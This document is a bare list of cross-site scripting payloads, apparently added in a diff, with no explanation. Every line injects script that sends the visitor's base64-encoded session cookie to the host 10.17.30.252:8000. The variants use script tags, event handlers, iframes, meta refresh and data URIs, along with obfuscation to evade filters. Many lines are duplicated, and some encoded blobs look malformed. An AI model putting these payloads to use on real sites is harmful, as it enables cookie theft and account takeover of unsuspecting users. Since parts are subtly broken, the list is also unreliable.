+/"><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT>
+?><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT>
+;"><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT>
+:"><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT>
+\"><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT>
+{{"><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT>
+}{"><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT>
+"><img src=x onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+'><img src=x onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+/"><img src=x onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+?"><img src=x onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+;'><img src=x onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+:"><img src=x onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+,'><img src=x onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<"><svg/onload=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+'><svg/onload=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+/"><svg/onload=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+?<svg/onload=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+;'><svg/onload=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+:"><svg/onload=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+,'><svg/onload=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+<"><iframe src=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+'><iframe src=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+/"><iframe src=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+?<iframe src=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+;'><iframe src=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+:"><iframe src=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+,'><iframe src=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+<"><input type=button onclick=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+'><input type=button onclick=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+/"><input type=button onclick=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+?<input type=button onclick=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+;'><input type=button onclick=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+:"><input type=button onclick=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+,'><input type=button onclick=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+<"><form action=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))><input type=submit></form>
+'><form action=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))><input type=submit></form>
+/"><form action=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))><input type=submit></form>
+?<form action=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))><input type=submit></form>
+;'><form action=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))><input type=submit></form>
+:"><form action=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))><input type=submit></form>
+,'><form action=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))><input type=submit></form>
+"><meta http-equiv=refresh content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+'><meta http-equiv=refresh content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<"><link rel=stylesheet href=data:text/css,*{background:url(http://10.17.30.252:8000/'+btoa(document.cookie))}>
+'><link rel=stylesheet href=data:text/css,*{background:url(http://10.17.30.252:8000/'+btoa(document.cookie))}>
+"><object data=data:application/xhtml+xml;base64,PHN2ZyBvbmxvYWQ9ZmV0Y2goJ2h0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcrYXRvYShkb2N1bWVudC5jb29raWUpKSI+>
+'><object data=data:application/xhtml+xml;base64,PHN2ZyBvbmxvYWQ9ZmV0Y2goJ2h0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcrYXRvYShkb2N1bWVudC5jb29raWUpKSI+>
+"><iframe src=data:application/xhtml+xml;base64,PHN2ZyBvbmxvYWQ9ZmV0Y2goJ2h0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcrYXRvYShkb2N1bWVudC5jb29raWUpKSI+>
+'><iframe src=data:application/xhtml+xml;base64,PHN2ZyBvbmxvYWQ9ZmV0Y2goJ2h0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcrYXRvYShkb2N1bWVudC5jb29raWUpKSI+>
+"><button onclick=location='http://10.17.30.252:8000/'+btoa(document.cookie)>Click me</button>
+'><button onclick=location='http://10.17.30.252:8000/'+btoa(document.cookie)>Click me</button>
+<"><meta charset=UTF-8><img src=http://10.17.30.252:8000/'+btoa(document.cookie)>
+'><meta charset=UTF-8><img src=http://10.17.30.252:8000/'+btoa(document.cookie)>
+"><audio onerror=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))></audio>
+'><audio onerror=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))></audio>
+"><svg><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT></svg>
+'><svg><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT
+<scr<script>ipt>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</scr<script>ipt>
+<s&#99;ript>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</s&#99;ript>
+<ScRiPt>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRiPt>
+<img src=x onerror=fetch('http://10.17.30.252:8000/'+btoa(document.cookie)) alt="test">
+<svg xmlns="http://www.w3.org/2000/svg"><script><![CDATA[fetch('http://10.17.30.252:8000/'+btoa(document.cookie))]]></script></svg>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIj4KPHNjcmlwdD5mZXRjaCgnaHR0cDovLzEwLjE3LjMwLjI1Mjo4MDAwLycgKyBiYXRvKGRvY3VtZW50LmNvb2tpZSkpPC9zY3JpcHQuPC9zdmc+Cg==" onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<form action="javascript:void(0)" onsubmit="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"><button type="submit">Submit</button></form>
+<style>@import url("data:text/css;base64,LmNvbnRlbnQge2JhY2tncm91bmQ6IHVybCgnaHR0cDovLzEwLjE3LjMwLjI1Mjo4MDAwLycgKyBiYXRvKGRvY3VtZW50LmNvb2tpZSk7fQ==");</style>
+<object data="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cDovLzEwLjE3LjMwLjI1Mjo4MDAwLycgKyBiYXRvKGRvY3VtZW50LmNvb2tpZSkpPC9zY3JpcHQuPC9vYmplY3Q+"></object>
+<meta http-equiv="refresh" content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<button onclick="location.href='http://10.17.30.252:8000/'+btoa(document.cookie)">Click me</button>
+<scr<script>ipt>fetch(String.fromCharCode(104,116,116,112,58,47,47,49,48,46,49,55,46,51,48,46,50,53,50,58,56,48,48,48,47,39,43,98,116,111,97,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))</scr<script>ipt>
+<s&#99;ript>eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,58,47,47,49,48,46,49,55,46,51,48,46,50,53,50,58,56,48,48,48,47,39,43,98,116,111,97,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))</s&#99;ript>
+<ScRiPt>document.write('<scr'+'ipt src="http://10.17.30.252:8000/'+btoa(document.cookie)+'"></scr'+'ipt>');</ScRiPt>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIj4KPHNjcmlwdD5mZXRjaCgnaHR0cDovLzEwLjE3LjMwLjI1Mjo4MDAwLycgKyBiYXRvKGRvY3VtZW50LmNvb2tpZSkpPC9zY3JpcHQuPC9zdmc+Cg==" onerror="eval('fetch(\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x31\\x30\\x2e\\x31\\x37\\x2e\\x33\\x30\\x2e\\x32\\x35\\x32\\x3a\\x38\\x30\\x30\\x30\\x2f'+btoa(document.cookie))')">
+<svg onload="fetch(decodeURIComponent('%68%74%74%70%3a%2f%2f%31%30%2e%31%37%2e%33%30%2e%32%35%32%3a%38%30%30%30%2f'+btoa(document.cookie)))"></svg>
+<object data="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnYWh0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvKzJldmFsbm8oZG9jdW1lbnQuY29va2llKSk8L3NjcmlwdD4="></object>
+<iframe src="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnYWh0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvKzJldmFsbm8oZG9jdW1lbnQuY29va2llKSk8L3NjcmlwdD4="></iframe>
+<form action="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"><input type="submit" value="Submit"></form>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"><meta http-equiv="refresh" content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<input type="hidden" value="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<div onclick="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Click me</div>
+<img src="x" onerror="eval('fetch(\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x31\\x30\\x2e\\x31\\x37\\x2e\\x33\\x30\\x2e\\x32\\x35\\x32\\x3a\\x38\\x30\\x30\\x30\\x2f'+btoa(document.cookie))')">
+<svg onload="fetch(String.fromCharCode(104,116,116,112,58,47,47,49,48,46,49,55,46,51,48,46,50,53,50,58,56,48,48,48,47,39,43,98,116,111,97,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))"></svg>
+<iframe src="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></iframe>
+<button onclick="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Click me</button>
+<object data="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnYWh0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvKzJldmFsbm8oZG9jdW1lbnQuY29va2llKSk8L3NjcmlwdD4="></object>
+<meta http-equiv="refresh" content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<style>@import url('data:text/css;base64,LmNvbnRlbnQge2JhY2tncm91bmQ6IHVybCgnYWh0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvKzJldmFsbm8oZG9jdW1lbnQuY29va2llKSk7fQ==');</style>
+<iframe src="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnYWh0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvKzJldmFsbm8oZG9jdW1lbnQuY29va2llKSk8L3NjcmlwdD4="></iframe>
+<script>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</script>
+<script>eval('fetch(\'http://10.17.30.252:8000/\'+btoa(document.cookie))')</script>
+<script>window.location='http://10.17.30.252:8000/'+btoa(document.cookie)</script>
+<script>document.body.innerHTML = '<img src=x onerror="fetch(\'http://10.17.30.252:8000/\'+btoa(document.cookie))">'</script>
+<script>eval(atob('ZmV0Y2goJ2h0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvK2J0b2FkKGRvY3VtZW50LmNvb2tpZSk='))</script>
+<svg onload="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></svg>
+<object data="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnYWh0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvKzJldmFsbm8oZG9jdW1lbnQuY29va2llKSk8L3NjcmlwdD4="></object>
+<iframe src="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnYWh0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvKzJldmFsbm8oZG9jdW1lbnQuY29va2llKSk8L3NjcmlwdD4="></iframe>
+<button onclick="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Click me</button>
+<form action="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"><input type="submit" value="Submit"></form>
+<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</script></svg>
+<iframe src="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></iframe>
+<meta http-equiv="refresh" content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<link rel="stylesheet" href="data:text/css;base64,YmFzZTY0IGVuY29kaW5nIGVuZCBkZWFkIGdhdGhlciBzdHJpbmcgdGhpcyBzdHlsZXM=">
+<input type="button" onclick="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))" value="Click me">
+<img src="x" onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))" alt="">
+<div onmouseover="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Hover me</div>
+<span onclick="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Click me</span>
+<style>@import url('data:text/css;base64,PHN0eWxlIHsgYmFzazogdXJsKCdodHRwOi8vMTAuMTcuMzAuMjU6ODAwMCcvJzsgfQ==');</style>
+<meta http-equiv="refresh" content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<svg><script>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</script></svg>
+<object data="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cDovLzEwLjE3LjMwLjI1Mjo4MDAwLycgKyBiYXRvKGRvY3VtZW50LmNvb2tpZSkpPC9zY3JpcHQuPC9vYmplY3Q+"></object>
+<iframe src="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cDovLzEwLjE3LjMwLjI1Mjo4MDAwLycgKyBiYXRvKGRvY3VtZW50LmNvb2tpZSkpPC9zY3JpcHQuPC9pZnJhbWUvPg=="></iframe>
+<button onclick="eval('fetch(\'http://10.17.30.252:8000/\'+btoa(document.cookie))')">Click me</button>
+<input type="button" onclick="eval('fetch(\'http://10.17.30.252:8000/\'+btoa(document.cookie))')" value="Click me">
+<form action="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"><input type="submit" value="Submit"></form>
+<a href="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Click me</a>
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4AAAAABJRU5ErkJggg==" onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<script>fetch(String.fromCharCode(104,116,116,112,58,47,47,49,48,46,49,55,46,51,48,46,50,53,50,58,56,48,48,48,47,39,43,98,116,111,97,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))</script>
+<object data="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnYWh0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvKzJldmFsbm8oZG9jdW1lbnQuY29va2llKSk8L3NjcmlwdD4="></object>
+<iframe src="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></iframe>
+<meta http-equiv="refresh" content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<button onclick="location.href='http://10.17.30.252:8000/'+btoa(document.cookie)">Click me</button>
+<input type="button" onclick="location.href='http://10.17.30.252:8000/'+btoa(document.cookie)" value="Click me">
+<style>@import url("data:text/css;base64,PHN0eWxlIHsgYmFzazogdXJsKCdodHRwOi8vMTAuMTcuMzAuMjU6ODAwMCcvJzsgfQ==");</style>
+<div onmouseover="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Hover me</div>
+<span onclick="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Click me</span>
+<input type="hidden" value="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<meta http-equiv="refresh" content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<style>@import url('data:text/css;base64,LmNvbnRlbnQge2JhY2tncm91bmQ6IHVybCgnYWh0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvJzsgfQ==');</style>
+<a href="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Click me</a>
+<svg onload="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></svg>
+<form action="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"><button type="submit">Submit</button></form>
+<button onclick="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Click me</button>
+<iframe src="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnYWh0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvKzJldmFsbm8oZG9jdW1lbnQuY29va2llKSk8L3NjcmlwdD4="></iframe>
+<object data="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnYWh0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvKzJldmFsbm8oZG9jdW1lbnQuY29va2llKSk8L3NjcmlwdD4="></object>
+<div onclick="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Click me</div>
+<iframe src="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnYWh0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvKzJldmFsbm8oZG9jdW1lbnQuY29va2llKSk8L3NjcmlwdD4="></iframe>
+<svg onload="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></svg>
+<button onclick="eval('fetch(\'http://10.17.30.252:8000/\'+btoa(document.cookie))')">Click me</button>
+<meta http-equiv="refresh" content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<input type="button" onclick="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))" value="Click me">
+<div onmouseover="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Hover me</div>
+<span onclick="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Click me</span>
+<style>@import url("data:text/css;base64,PHN0eWxlIHsgYmFzazogdXJsKCdodHRwOi8vMTAuMTcuMzAuMjU6ODAwMCcvJzsgfQ==");</style>
+<a href="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Click me</a>
+<script>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</script>
+<meta http-equiv="refresh" content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIj4KPHNjcmlwdD5mZXRjaCgnaHR0cDovLzEwLjE3LjMwLjI1Mjo4MDAwLycgKyBiYXRvKGRvY3VtZW50LmNvb2tpZSkpPC9zY3JpcHQuPC9zdmc+Cg==" onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<form action="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"><input type="submit" value="Submit"></form>
+<button onclick="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Click me</button>
+<input type="button" onclick="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))" value="Click me">
+<meta http-equiv="refresh" content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<iframe src="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></iframe>
+<button onclick="eval('fetch(\'http://10.17.30.252:8000/\'+btoa(document.cookie))')">Click me</button>
+<a href="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Click me</a>
+<object data="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnYWh0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvKzJldmFsbm8oZG9jdW1lbnQuY29va2llKSk8L3NjcmlwdD4="></object>
+<iframe src="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnYWh0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvKzJldmFsbm8oZG9jdW1lbnQuY29va2llKSk8L3NjcmlwdD4="></iframe>
+<meta http-equiv="refresh" content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<scr<script>ipt>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</scr<script>ipt>
+<s&#99;ript>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</s&#99;ript>
+<ScRiPt>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRiPt>
+<img src=x onerror=fetch('http://10.17.30.252:8000/'+btoa(document.cookie)) alt="test">
+<svg xmlns="http://www.w3.org/2000/svg"><script><![CDATA[fetch('http://10.17.30.252:8000/'+btoa(document.cookie))]]></script></svg>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIj4KPHNjcmlwdD5mZXRjaCgnaHR0cDovLzEwLjE3LjMwLjI1Mjo4MDAwLycgKyBiYXRvKGRvY3VtZW50LmNvb2tpZSkpPC9zY3JpcHQuPC9zdmc+Cg==" onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<form action="javascript:void(0)" onsubmit="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"><button type="submit">Submit</button></form>
+<style>@import url("data:text/css;base64,LmNvbnRlbnQge2JhY2tncm91bmQ6IHVybCgnaHR0cDovLzEwLjE3LjMwLjI1Mjo4MDAwLycgKyBiYXRvKGRvY3VtZW50LmNvb2tpZSk7fQ==");</style>
+<object data="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cDovLzEwLjE3LjMwLjI1Mjo4MDAwLycgKyBiYXRvKGRvY3VtZW50LmNvb2tpZSkpPC9zY3JpcHQuPC9vYmplY3Q+"></object>
+<meta http-equiv="refresh" content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<button onclick="location.href='http://10.17.30.252:8000/'+btoa(document.cookie)">Click me</button>
+<svg onload="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></svg>
+<input type="hidden" value="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<style>@import url("data:text/css;base64,PHN0eWxlIHsgYmFzazogdXJsKCdodHRwOi8vMTAuMTcuMzAuMjU6ODAwMCcvJzsgfQ==");</style>
+<div onclick="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Click me</div>
+<form action="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"><input type="submit" value="Submit"></form>
+<a href="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Click me</a>
+<span onclick="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Click me</span>
+<script>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</script>
+<meta http-equiv="refresh" content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<iframe src="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnYWh0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvKzJldmFsbm8oZG9jdW1lbnQuY29va2llKSk8L3NjcmlwdD4="></iframe>
+<object data="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnYWh0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvKzJldmFsbm8oZG9jdW1lbnQuY29va2llKSk8L3NjcmlwdD4="></object>
+<img src="x" onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<input type="button" onclick="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))" value="Click me">
+<form action="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"><input type="submit" value="Submit"></form>
+<style>@import url('data:text/css;base64,PHN0eWxlIHsgYmFzazogdXJsKCdodHRwOi8vMTAuMTcuMzAuMjU6ODAwMCcvJzsgfQ==');</style>
+<button onclick="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Click me</button>
+<input type="hidden" value="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<meta http-equiv="refresh" content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<style>@import url('data:text/css;base64,PHN0eWxlIHsgYmFzazogdXJsKCdodHRwOi8vMTAuMTcuMzAuMjU6ODAwMCcvJzsgfQ==');</style>
+<object data="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnYWh0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvKzJldmFsbm8oZG9jdW1lbnQuY29va2llKSk8L3NjcmlwdD4="></object>
+<svg onload="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></svg>
+<input type="hidden" value="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<style>@import url('data:text/css;base64,PHN0eWxlIHsgYmFzazogdXJsKCdodHRwOi8vMTAuMTcuMzAuMjU6ODAwMCcvJzsgfQ==');</style>
+<meta http-equiv="refresh" content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<object data="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnYWh0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvKzJldmFsbm8oZG9jdW1lbnQuY29va2llKSk8L3NjcmlwdD4="></object>
+<iframe src="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnYWh0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvKzJldmFsbm8oZG9jdW1lbnQuY29va2llKSk8L3NjcmlwdD4="></iframe>
+<meta http-equiv="refresh" content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<a href="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Click me</a>
+<style>@import url('data:text/css;base64,PHN0eWxlIHsgYmFzazogdXJsKCdodHRwOi8vMTAuMTcuMzAuMjU6ODAwMCcvJzsgfQ==');</style>
+<img src="x" onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))" alt="">
+<svg onload="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></svg>
+<button onclick="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Click me</button>
+<meta http-equiv="refresh" content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<iframe src="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnYWh0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvKzJldmFsbm8oZG9jdW1lbnQuY29va2llKSk8L3NjcmlwdD4="></iframe>
+<object data="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnYWh0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvKzJldmFsbm8oZG9jdW1lbnQuY29va2llKSk8L3NjcmlwdD4="></object>
+<meta http-equiv="refresh" content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<button onclick="eval('fetch(\'http://10.17.30.252:8000/\'+btoa(document.cookie))')">Click me</button>
+<form action="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"><button type="submit">Submit</button></form>
+<a href="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Click me</a>
+<svg onload="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></svg>
+<object data="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnYWh0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvKzJldmFsbm8oZG9jdW1lbnQuY29va2llKSk8L3NjcmlwdD4="></object>
+<iframe src="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnYWh0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvKzJldmFsbm8oZG9jdW1lbnQuY29va2llKSk8L3NjcmlwdD4="></iframe>
+<meta http-equiv="refresh" content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<object data="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnYWh0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvKzJldmFsbm8oZG9jdW1lbnQuY29va2llKSk8L3NjcmlwdD4="></object>
+<iframe src="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnYWh0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcvKzJldmFsbm8oZG9jdW1lbnQuY29va2llKSk8L3NjcmlwdD4="></iframe>
+<button onclick="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Click me</button>
+<svg onload="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></svg>
+<meta http-equiv="refresh" content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<style>@import url("data:text/css;base64,PHN0eWxlIHsgYmFzazogdXJsKCdodHRwOi8vMTAuMTcuMzAuMjU6ODAwMCcvJzsgfQ==");</style>
+<a href="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Click me</a>
+<button onclick="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Click me</button>
